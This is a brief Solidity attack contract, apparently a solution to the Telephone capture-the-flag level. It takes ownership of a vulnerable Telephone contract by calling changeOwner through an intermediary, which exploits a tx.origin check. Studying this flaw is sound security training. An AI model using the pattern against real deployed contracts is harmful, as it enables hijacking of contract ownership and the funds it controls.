// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attack {
    Telephone telephoneContract;

    constructor(Telephone _telephoneContract) public {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
